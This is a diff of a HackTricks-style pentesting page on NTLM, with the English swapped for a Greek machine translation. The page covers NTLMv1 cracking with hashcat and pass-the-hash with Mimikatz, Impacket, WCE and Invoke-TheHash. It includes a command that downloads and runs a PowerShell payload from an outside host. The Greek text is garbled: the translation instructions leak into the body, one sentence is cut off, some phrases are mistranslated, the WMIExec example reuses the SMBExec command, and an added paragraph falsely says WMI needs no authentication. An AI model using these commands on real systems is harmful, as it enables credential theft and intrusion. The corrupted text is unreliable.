@@ -2,52 +2,49 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Συμμετάσχετε** [**💬**](https://emojipedia.org/speech-balloon/) **στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Basic Information
+## Βασικές Πληροφορίες
 
-In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.
+Σε περιβάλλοντα όπου λειτουργούν τα **Windows XP και Server 2003**, χρησιμοποιούνται τα hashes του LM (Lan Manager), αν και είναι γνωστό ότι αυτά μπορούν εύκολα να διαρρεύσουν. Ένα συγκεκριμένο hash του LM, `AAD3B435B51404EEAAD3B435B51404EE`, υποδηλώνει μια περίπτωση όπου δεν χρησιμοποιείται το LM, αντιπροσωπεύοντας το hash για μια κενή συμβολοσειρά.
 
-By default, the **Kerberos** authentication protocol is the primary method used. NTLM (NT LAN Manager) steps in under specific circumstances: absence of Active Directory, non-existence of the domain, malfunctioning of Kerberos due to improper configuration, or when connections are attempted using an IP address rather than a valid hostname.
+Από προεπιλογή, το πρωτόκολλο πιστοποίησης **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) εμφανίζεται σε συγκεκριμένες περιπτώσεις: απουσία του Active Directory, μη ύπαρξη του τομέα, δυσλειτουργία του Kerberos λόγω εσφαλμένης ρύθμισης ή όταν γίνονται προσπάθειες σύνδεσης χρησιμοποιώντας μια διεύθυνση IP αντί για ένα έγκυρο όνομα κεντρικού υπολογιστή.
 
-The presence of the **"NTLMSSP"** header in network packets signals an NTLM authentication process.
+Η παρουσία του κεφαλίδας **"NTLMSSP"** στα πακέτα δικτύου υποδεικνύει ένα διαδικασία πιστοποίησης NTLM.
 
-Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitated by a specific DLL located at `%windir%\Windows\System32\msv1\_0.dll`.
+Η υποστήριξη για τα πρωτόκολλα πιστοποίησης - LM, NTLMv1 και NTLMv2 - διευκολύνεται από ένα συγκεκριμένο DLL που βρίσκεται στη διαδρομή `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Key Points**:
-- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
-- Kerberos is the default authentication method, with NTLM used only under certain conditions.
-- NTLM authentication packets are identifiable by the "NTLMSSP" header.
-- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
+**Βασικά Σημεία**:
+- Τα hashes του LM είναι ευάλωτα και ένα κενό hash του LM (`AAD3B435B51404EEAAD3B435B51404EE`) υποδηλώνει τη μη χρήση του.
+- Το Kerberos είναι η προεπιλεγμένη μέθοδος πιστοποίησης, με το NTLM να χρησιμοποιείται μόνο υπό συγκεκριμένες συνθήκες.
+- Τα πακέτα πιστοποίησης NTLM είναι αναγνωρίσιμα από τον κεφαλίδα "NTLMSSP".
+- Τα πρωτόκολλα LM, NTLMv1 και NTLMv2 υποστηρίζονται από το αρχείο συστήματος `msv1\_0.dll`.
 
-## LM, NTLMv1 and NTLMv2
+## LM, NTLMv1 και NTLMv2
 
-You can check and configure which protocol will be used:
+Μπορείτε να ελέγξετε και να ρυθμίσετε ποιο πρωτόκολλο θα χρησιμοποιηθεί:
 
-### GUI
+### Γραφική Διεπαφή Χρήστη (GUI)
 
-Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
+Εκτελέστε το _secpol.msc_ -> Τοπικές πολιτικές -> Επιλογές ασφάλειας -> Ασφάλεια δικτύου: Επίπεδο πιστοποίησης LAN Manager. Υπάρχουν 6 επίπεδα (από 0 έως 5).
 
 ![](<../../.gitbook/assets/image (92).png>)
 
-### Registry
+### Μητρώο (Registry)
 
-This will set the level 5:
-
+Αυτό θα ορίσει το επίπεδο 5:
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-
-Possible values:
-
+Δυνατές τιμές:
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -56,56 +53,48 @@ Possible values:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
+## Βασική διαδικασία ελέγχου ταυτότητας NTLM Domain
 
-## Basic NTLM Domain authentication Scheme
+1. Ο **χρήστης** εισάγει τα **διαπιστευτήριά του**
+2. Η μηχανή πελάτης **στέλνει ένα αίτημα ελέγχου ταυτότητας** αποστέλλοντας το **όνομα του τομέα** και το **όνομα χρήστη**
+3. Ο **διακομιστής** στέλνει την **πρόκληση**
+4. Ο **πελάτης κρυπτογραφεί** την **πρόκληση** χρησιμοποιώντας το κατακερματισμένο συνθηματικό ως κλειδί και την αποστέλλει ως απάντηση
+5. Ο **διακομιστής αποστέλλει** στον **ελεγκτή τομέα** το **όνομα του τομέα, το όνομα χρήστη, την πρόκληση και την απάντηση**. Εάν δεν έχει ρυθμιστεί ένας ενεργός κατάλογος ή το όνομα του τομέα είναι το όνομα του διακομιστή, τα διαπιστευτήρια ελέγχονται τοπικά.
+6. Ο **ελεγκτής τομέα ελέγχει εάν όλα είναι σωστά** και αποστέλλει τις πληροφορίες στον διακομιστή
 
-1. The **user** introduces his **credentials**
-2. The client machine **sends an authentication request** sending the **domain name** and the **username**
-3. The **server** sends the **challenge**
-4. The **client encrypts** the **challenge** using the hash of the password as key and sends it as response
-5. The **server sends** to the **Domain controller** the **domain name, the username, the challenge and the response**. If there **isn't** an Active Directory configured or the domain name is the name of the server, the credentials are **checked locally**.
-6. The **domain controller checks if everything is correct** and sends the information to the server
+Ο **διακομιστής** και ο **ελεγκτής τομέα** μπορούν να δημιουργήσουν ένα **ασφαλές κανάλι** μέσω του διακομιστή **Netlogon**, καθώς ο ελεγκτής τομέα γνωρίζει το συνθηματικό του διακομιστή (βρίσκεται μέσα στη βάση δεδομένων **NTDS.DIT**).
 
-The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server (it is inside the **NTDS.DIT** db).
+### Τοπική διαδικασία ελέγχου ταυτότητας NTLM
 
-### Local NTLM authentication Scheme
+Ο έλεγχος ταυτότητας είναι όπως αναφέρθηκε **προηγουμένως, αλλά** ο **διακομιστής γνωρίζει τον κατακερματισμένο κωδικό του χρήστη** που προσπαθεί να ελεγχθεί μέσα στο αρχείο **SAM**. Έτσι, αντί να ζητήσει από τον ελεγκτή τομέα, ο **διακομιστής θα ελέγξει μόνος του** εάν ο χρήστης μπορεί να ελεγχθεί.
 
-The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.
+### Πρόκληση NTLMv1
 
-### NTLMv1 Challenge
+Το μήκος της **πρόκλησης είναι 8 bytes** και η **απάντηση είναι 24 bytes**.
 
-The **challenge length is 8 bytes** and the **response is 24 bytes** long.
+Το **κατακερματισμένο NT (16bytes)** διαιρείται σε **3 μέρη των 7bytes έκαστο** (7B + 7B + (2B+0x00\*5)): το **τελευταίο μέρος γεμίζει με μηδενικά**. Στη συνέχεια, η **πρόκληση** κρυπτογραφείται ξεχωριστά με κάθε μέρος και τα **αποτελέσματα** της κρυπτογράφησης συνδέονται. Σύνολο: 8B + 8B + 8B = 24Bytes.
 
-The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): the **last part is filled with zeros**. Then, the **challenge** is **ciphered separately** with each part and the **resulting** ciphered bytes are **joined**. Total: 8B + 8B + 8B = 24Bytes.
+**Προβλήματα**:
 
-**Problems**:
+* Έλλειψη **τυχαιότητας**
+* Τα 3 μέρη μπορούν να **επιτεθούν ξεχωριστά** για να βρεθεί το κατακερματισμένο NT
+* Το **DES είναι ευάλωτο** σε επίθεση
+* Το 3ο κλειδί αποτελείται πάντα από **5 μηδενικά**
+* Δεδομένης της **ίδιας πρόκλησης**, η **απάντηση** θα είναι **ίδια**. Έτσι, μπορείτε να δώσετε ως **πρόκληση** στο θύμα τον χαρακτήρα "**1122334455667788**" και να επιτεθείτε στην απάντηση χρησιμοποιώντας **προ-υπολογισμένους πίνακες ουράνιου τόξου**.
 
-* Lack of **randomness**
-* The 3 parts can be **attacked separately** to find the NT hash
-* **DES is crackable**
-* The 3º key is composed always by **5 zeros**.
-* Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
+### Επίθεση NTLMv1
 
-### NTLMv1 attack
+Σήμερα είναι λιγότερο συνηθισμένο να βρείτε περιβάλλοντα με ρυθμισμένη Απεριόριστη Ανάθεση, αλλά αυτό δεν σημαίνει ότι δεν μπορείτε να **καταχραστείτε έναν υπηρεσία εκτύπωσης** που έχει ρυθμιστεί.
 
-Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.
+Μπορείτε να καταχραστείτε ορισμένα διαπιστευτήρια/συνεδρίες που ήδη έχετε στον AD για να **ζητήσετε από τον εκτυπωτή να ελεγχθεί** έναν **κόμβο υπό τον έλεγχό σας**. Στη συνέχεια, χρησιμοποιώντας το `metasploit auxiliary/server/capture/smb` ή το `responder`, μπορείτε να **ορίσετε την πρόκληση ελέγχου ταυτότητας σε 1122334455667788**, να καταγράψετε την προσπάθεια ελέγχου ταυτότητας και αν αυτή έγινε χρησιμοποιώντας **NTLMv1** θα μπορέσετε να την **αποκρυπτογραφήσετε**.\
+Εάν χρησιμοποιείτε το `responder`, μπορείτε να **δοκιμάσετε να χρησιμοποιήσετε τη σημαία `--lm`** για να προσπαθήσετε να **υποβαθμίσετε** τον **έλεγχο ταυτότητας**.\
+_Σημειώστε ότι για αυτήν την τεχνική ο έλεγχος ταυτότητας πρέπει να γίνεται χρησιμοποιώντας NTLMv1 (το NTLMv2 δεν είναι έγκυρο)._
 
-You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
-If you are using `responder` you could try to \*\*use the flag `--lm` \*\* to try to **downgrade** the **authentication**.\
-_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
-
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) for example).
-
-### NTLMv1 attack with hashcat
-
-NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.
-
-The command
+Να θυμάστε ότι ο εκτυπωτής θα χρησιμοποιήσει τον λογαριασμό υπολογιστή κατά τη διάρκεια του ελέγχου ταυτότητας και οι λογαριασμοί υπολογιστών χρησιμοποιούν **μακριά και τυχαία συνθηματικά** που πιθανότατα δεν θα μπορέσετε να αποκρυπτογραφήσετε χρησιμοποιώντας συνηθισμένα **λεξικά**. Ωστόσο, ο έλεγχος ταυτότητας **NTLMv1** χρησιμοποιεί το DES ([περισσότερες πληροφορίες εδώ](./#ntlmv1-challenge)), οπότε χρησιμοποιώντας ορισμένες υπηρεσίες που είναι ειδικά αφιερωμένες στην αποκρυπτογράφηση DES θα μπορέσετε να το αποκ
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-would output the below:
-
+Θα εξάγατε το παρακάτω:
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -131,20 +120,16 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-
-Create a file with the contents of:
+Δημιουργήστε ένα αρχείο με το περιεχόμενο:
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-
-Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
-
+Εκτελέστε το hashcat (καλύτερα διανεμημένο μέσω ενός εργαλείου όπως το hashtopolis), διότι αλλιώς θα χρειαστούν αρκετές ημέρες.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-
-In this case we know the password to this is password so we are going to cheat for demo purposes:
+Σε αυτήν την περίπτωση γνωρίζουμε ότι ο κωδικός πρόσβασης είναι "password", οπότε θα κάνουμε απάτη για διαδικαστικούς λόγους:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -153,9 +138,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-
-We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
-
+Τώρα πρέπει να χρησιμοποιήσουμε τα εργαλεία του hashcat για να μετατρέψουμε τα σπασμένα κλειδιά des σε μέρη του NTLM hash:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -163,140 +146,128 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-
-Ginally the last part:
-
+Τελικά η τελευταία μέρα:
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-
-Combine them together:
-
+Το ακόλουθο περιεχόμενο είναι από ένα βιβλίο για χάκινγκ σχετικά με τεχνικές χάκινγκ. Το παρακάτω περιεχόμενο είναι από το αρχείο /hive/hacktricks/windows-hardening/ntlm/README.md. Μεταφράστε το σχετικό αγγλικό κείμενο στα ελληνικά και επιστρέψτε τη μετάφραση διατηρώντας ακριβώς την ίδια σύνταξη markdown και html. Μην μεταφράσετε πράγματα όπως κώδικας, ονόματα τεχνικών χάκινγκ, χάκινγκ λέξεις, ονόματα πλατφορμών cloud/SaaS (όπως Workspace, aws, gcp...), η λέξη 'διαρροή', pentesting και ετικέτες markdown. Επίσης, μην προσθέσετε κανένα επιπλέον περιεχόμενο εκτός από τη μετάφραση και τη σύνταξη markdown.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
+### NTLMv2 Πρόκληση
 
-### NTLMv2 Challenge
+Το μήκος της πρόκλησης είναι 8 bytes και στέλνονται 2 απαντήσεις: Μία είναι 24 bytes και το μήκος της άλλης είναι μεταβλητό.
 
-The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
+Η πρώτη απάντηση δημιουργείται κρυπτογραφώντας χρησιμοποιώντας HMAC_MD5 το string που αποτελείται από τον πελάτη και τον τομέα και χρησιμοποιώντας ως κλειδί το hash MD4 του NT hash. Στη συνέχεια, το αποτέλεσμα θα χρησιμοποιηθεί ως κλειδί για να κρυπτογραφηθεί χρησιμοποιώντας HMAC_MD5 η πρόκληση. Σε αυτό, θα προστεθεί μια πρόκληση πελάτη 8 bytes. Σύνολο: 24 B.
 
-**The first response** is created by ciphering using **HMAC\_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC\_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
+Η δεύτερη απάντηση δημιουργείται χρησιμοποιώντας αρκετές τιμές (μια νέα πρόκληση πελάτη, ένα χρονικό σημείο για να αποφευχθούν επαναληπτικές επιθέσεις...).
 
-The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)
-
-If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+Εάν έχετε ένα pcap που έχει καταγράψει ένα επιτυχημένο διαδικασία πιστοποίησης, μπορείτε να ακολουθήσετε αυτόν τον οδηγό για να λάβετε τον τομέα, το όνομα χρήστη, την πρόκληση και την απάντηση και να προσπαθήσετε να αποκτήσετε τον κωδικό πρόσβασης: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
-**Once you have the hash of the victim**, you can use it to **impersonate** it.\
-You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.
+Μόλις έχετε το hash του θύματος, μπορείτε να το χρησιμοποιήσετε για να προσομοιώσετε το θύμα.
 
-**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**
+Χρειάζεστε ένα εργαλείο που θα πραγματοποιήσει την πιστοποίηση NTLM χρησιμοποιώντας αυτό το hash, ή μπορείτε να δημιουργήσετε ένα νέο sessionlogon και να εισαγάγετε αυτό το hash μέσα στο LSASS, έτσι ώστε όταν πραγματοποιείται οποιαδήποτε πιστοποίηση NTLM, θα χρησιμοποιηθεί αυτό το hash. Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.
 
-### **Mimikatz**
+Παρακαλώ, θυμηθείτε ότι μπορείτε να πραγματοποιήσετε επιθέσεις Pass-the-Hash χρησιμοποιώντας επίσης λογαριασμούς Υπολογιστή.
 
-**Needs to be run as administrator**
+### Mimikatz
 
+Πρέπει να εκτελεστεί ως διαχειριστής
 ```bash
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
+Αυτό θα ξεκινήσει ένα διεργασία που θα ανήκει στους χρήστες που έχουν εκτελέσει το mimikatz, αλλά εσωτερικά στο LSASS, οι αποθηκευμένες πιστοποιητικές πληροφορίες είναι αυτές που βρίσκονται μέσα στις παραμέτρους του mimikatz. Έπειτα, μπορείτε να έχετε πρόσβαση σε δικτυακούς πόρους ως αν ήσασταν αυτός ο χρήστης (παρόμοιο με το κόλπο `runas /netonly`, αλλά δεν χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης σε απλό κείμενο).
 
-This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).
+### Pass-the-Hash από το Linux
 
-### Pass-the-Hash from linux
+Μπορείτε να αποκτήσετε εκτέλεση κώδικα σε μηχανήματα Windows χρησιμοποιώντας το Pass-the-Hash από το Linux.\
+[**Προσπελάστε εδώ για να μάθετε πώς να το κάνετε.**](../../windows/ntlm/broken-reference/)
 
-You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
-[**Access here to learn how to do it.**](../../windows/ntlm/broken-reference/)
+### Εργαλεία Impacket για Windows
 
-### Impacket Windows compiled tools
-
-You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
+Μπορείτε να κατεβάσετε δυαδικά αρχεία impacket για Windows εδώ: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
 
 * **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-* **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-* There are several more Impacket binaries...
+* **atexec.exe** (Σε αυτήν την περίπτωση πρέπει να καθορίσετε μια εντολή, οι cmd.exe και powershell.exe δεν είναι έγκυρες για να αποκτήσετε μια διαδραστική κέλυφος)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+* Υπάρχουν και άλλα δυαδικά αρχεία Impacket...
 
 ### Invoke-TheHash
 
-You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+Μπορείτε να αποκτήσετε τα scripts powershell από εδώ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
-
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
 #### Invoke-WMIExec
 
+Ο `Invoke-WMIExec` είναι ένα εργαλείο PowerShell που χρησιμοποιείται για να εκτελέσει εντολές σε απομακρυσμένους υπολογιστές μέσω του πρωτοκόλλου WMI (Windows Management Instrumentation). Αυτό το εργαλείο εκμεταλλεύεται την αδυναμία του πρωτοκόλλου WMI να απαιτεί ελέγχους ταυτότητας, επιτρέποντας σε έναν επιτιθέμενο να εκτελέσει κακόβουλο κώδικα σε έναν απομακρυσμένο υπολογιστή.
+
+Για να χρησιμοποιήσετε το `Invoke-WMIExec`, απλά εκτελέστε το PowerShell script και παρέχετε τις απαραίτητες παραμέτρους, όπως το όνομα χρήστη και ο κωδικός πρόσβασης για τον απομακρυσμένο υπολογιστή. Το εργαλείο θα εκτελέσει την εντολή που έχετε καθορίσει στον απομακρυσμένο υπολογιστή και θα επιστρέψει τα αποτελέσματα στον υπολογιστή εκτέλεσης.
+
+Είναι σημαντικό να σημειωθεί ότι η χρήση του `Invoke-WMIExec` για εκτέλεση εντολών σε απομακρυσμένους υπολογιστές απαιτεί δικαιώματα διαχειριστή στον απομακρυσμένο υπολογιστή. Επίσης, πρέπει να ληφθούν υπόψη οι επιπτώσεις ασφαλείας και να χρησιμοποιηθεί με προσοχή.
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
-#### Invoke-SMBClient
-
+#### Εκτέλεση-SMBClient
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
-
-#### Invoke-SMBEnum
-
+#### Εκτέλεση-SMBEnum
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
-
 #### Invoke-TheHash
 
-This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.
-
+Αυτή η συνάρτηση είναι ένας **συνδυασμός** όλων των άλλων. Μπορείτε να περάσετε **πολλούς υπολογιστές**, να **αποκλείσετε** κάποιους και να **επιλέξετε** τη **επιλογή** που θέλετε να χρησιμοποιήσετε (_SMBExec, WMIExec, SMBClient, SMBEnum_). Εάν επιλέξετε **οποιαδήποτε** από τις **SMBExec** και **WMIExec**, αλλά δεν δώσετε κανένα παράμετρο _**Command**_, απλώς θα **ελέγξει** αν έχετε **επαρκή δικαιώματα**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
+### [Κακόβουλο-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
-### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
+### Επεξεργαστής Πιστοποιητικών των Windows (WCE)
 
-### Windows Credentials Editor (WCE)
+**Πρέπει να εκτελεστεί ως διαχειριστής**
 
-**Needs to be run as administrator**
-
-This tool will do the same thing as mimikatz (modify LSASS memory).
-
+Αυτό το εργαλείο θα κάνει το ίδιο πράγμα με το mimikatz (τροποποίηση της μνήμης του LSASS).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-
-### Manual Windows remote execution with username and password
+### Εκτέλεση απομακρυσμένων εντολών σε Windows με όνομα χρήστη και κωδικό πρόσβασης
 
 {% content-ref url="../lateral-movement/" %}
 [lateral-movement](../lateral-movement/)
 {% endcontent-ref %}
 
-## Extracting credentials from a Windows Host
+## Εξαγωγή διαπιστευτηρίων από έναν Windows υπολογιστή
 
-**For more information about** [**how to obtain credentials from a Windows host you should read this page**](broken-reference)**.**
+**Για περισσότερες πληροφορίες σχετικά με το πώς να αποκτήσετε διαπιστευτήρια από έναν Windows υπολογιστή, πρέπει να διαβάσετε αυτήν τη σελίδα** [**εδώ**](broken-reference)**.**
 
-## NTLM Relay and Responder
+## NTLM Relay και Responder
 
-**Read more detailed guide on how to perform those attacks here:**
+**Διαβάστε περισσότερες λεπτομερείς οδηγίες σχετικά με το πώς να πραγματοποιήσετε αυτές τις επιθέσεις εδώ:**
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-## Parse NTLM challenges from a network capture
+## Ανάλυση προκλήσεων NTLM από ένα καταγραφή δικτύου
 
-**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
